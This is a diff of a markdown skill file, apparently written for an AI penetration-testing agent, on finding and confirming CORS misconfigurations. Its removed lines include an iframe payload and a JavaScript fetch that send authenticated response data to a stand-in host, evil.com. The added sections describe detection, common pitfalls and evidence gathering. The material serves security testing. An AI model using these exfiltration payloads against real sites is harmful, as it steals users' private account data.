@@ -1,4 +1,4 @@
----
+﻿---
 name: cors-misconfig
 description: "CORS misconfiguration exploitation including null origin, subdomain matching, and wildcard reflection"
 category: specialized
@@ -61,15 +61,6 @@ The simplest CORS misconfiguration: the server echoes the request `Origin` heade
 3. If the `Origin` value appears in `ACAO`, the server is reflecting it
 4. Check if `Access-Control-Allow-Credentials: true` is also present
 
-```
-GET /api/user HTTP/1.1
-Host: target.com
-Origin: https://evil.com
-
-Response:
-Access-Control-Allow-Origin: https://evil.com
-Access-Control-Allow-Credentials: true
-```
 
 **If both ACAO reflects origin AND ACAC is true**, this is a critical vulnerability. An attacker can host a page that makes authenticated cross-origin requests and reads the response.
 
@@ -85,14 +76,6 @@ When servers whitelist `null` as an allowed origin, attackers can trigger reques
 
 **Test payload:**
 
-```html
-<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
-  src="data:text/html,<script>
-    fetch('https://target.com/api/user', {credentials:'include'})
-      .then(r=>r.text()).then(t=>location='https://evil.com/?data='+btoa(t));
-  </script>">
-</iframe>
-```
 
 **Steps:**
 
@@ -113,9 +96,6 @@ If the server allows `*.target.com`, an attacker controlling `evil-target.com` o
 
 **Test:**
 
-```
-Origin: https://evil-target.com
-```
 
 If `ACAO: https://evil-target.com` is returned, suffix matching is in use and exploitable.
 
@@ -135,9 +115,6 @@ A wildcard `ACAO: *` with `ACAC: true` is technically invalid — browsers block
 
 **Test:**
 
-```
-Origin: https://evil.com
-```
 
 If `ACAO: https://evil.com` (reflected) is returned instead of `ACAO: *`, the wildcard is not the real policy — the reflection is the vulnerability.
 
@@ -149,9 +126,6 @@ If the target serves over HTTPS but accepts `Origin: http://target.com`, this is
 
 **Test:**
 
-```
-Origin: http://target.com
-```
 
 If `ACAO: http://target.com` is returned on an HTTPS endpoint, an attacker on the same network (or a malicious HTTP page) can make cross-origin requests.
 
@@ -163,25 +137,16 @@ Servers sometimes use naive string matching instead of proper origin parsing.
 
 ### Prefix Attack
 
-```
-Origin: https://attacktarget.com
-```
 
 If the server checks `origin.startsWith("https://target")`, this passes because `"https://attacktarget.com"` starts with `"https://target"`.
 
 ### Suffix Attack
 
-```
-Origin: https://nottarget.com
-```
 
 If the server checks `origin.endsWith("target.com")`, this passes.
 
 ### Substring Attack
 
-```
-Origin: https://notatarget.com.evil.com
-```
 
 If the server checks `origin.includes("target.com")`, this passes.
 
@@ -204,18 +169,6 @@ Once a CORS misconfiguration is confirmed with `ACAC: true` and reflected/whitel
 
 **Exfiltration payload:**
 
-```javascript
-fetch('https://target.com/api/user/profile', {
-  credentials: 'include'
-})
-.then(r => r.json())
-.then(data => {
-  fetch('https://evil.com/log', {
-    method: 'POST',
-    body: JSON.stringify(data)
-  });
-});
-```
 
 ---
 
@@ -241,3 +194,24 @@ Some servers only apply CORS validation on GET preflights but not on POST, PUT, 
 - **Credentials flag matters**: A reflected ACAO without `ACAC: true` is not exploitable for credential theft — state this clearly
 - **Null origin is not always a flaw**: Only vulnerable if the server returns `ACAO: null` in response to `Origin: null` AND the application uses cookie-based auth
 - **Do not assume wildcard is exploitable**: `ACAO: *` with `ACAC: true` is blocked by browsers — only flag it if you confirm a bypass or a non-browser exfiltration path
+
+## Trigger Conditions
+
+Activate when responses carry `Access-Control-Allow-Origin` (ACAO) headers, especially on API/authenticated endpoints, or when an `Origin` you send is echoed back. Trigger on credential-bearing flows (cookie/`Authorization` auth) where `Access-Control-Allow-Credentials: true` may accompany ACAO. Also relevant for null-origin whitelists, wildcard, subdomain/suffix/substring matching, and HTTP/HTTPS origin mismatches. Do not trigger on same-origin-only responses with no CORS headers, or non-browser server-to-server contexts where CORS is irrelevant.
+
+## Detection Approach
+
+Send crafted `Origin` headers and inspect the response ACAO. If ACAO reflects your origin, verify whether `ACAC: true` is also present — reflection without credentials is low-impact. Test the null-origin case (`Origin: null`) when sandboxed-iframe/data-URI attacks are plausible and cookie auth is used. Test subdomain/suffix/prefix/substring matching (`evil-target.com`, `attacktarget.com`) to expose naive string checks. For wildcard, confirm whether a reflected origin appears when `Origin` is present (the real flaw) vs a static `*`. Always check both the preflight (`OPTIONS`) and the actual response, since policies can differ. Confirm exploitability by reasoning about whether browser-enforced credentials would be readable — a reflected ACAO without ACAC is not credential-theft exploitable.
+
+## Pitfalls
+
+- Claiming reflection without seeing the exact `Origin` echoed in ACAO from tool output.
+- Treating reflected ACAO without `ACAC: true` as credential theft — browsers won't send cookies; impact collapses.
+- Assuming `ACAO: *` + `ACAC: true` is exploitable — browsers block that combo; only flag with a confirmed bypass.
+- Calling null-origin a flaw when the app uses non-cookie auth (bearer in localStorage, never sent cross-origin).
+- Guessing endpoints — only test origins/paths that exist on the target.
+- Overlooking preflight vs actual-response mismatch in origin handling.
+
+## Verification & Impact
+
+CONFIRMED when ACAO reflects an attacker-controlled origin (or null/subdomain) AND `ACAC: true` is present, demonstrated by a cross-origin `fetch` with `credentials: 'include'` that can read the response (profile, tokens, admin data). SUSPECTED when a misconfiguration exists but credential readability isn't proven — record as candidate. Document impact by data accessible cross-origin (PII, tokens, authenticated API data) and severity (typically High when credentials + sensitive data). Capture the probe request/response headers and the exfiltration proof via `recordEvidence`.
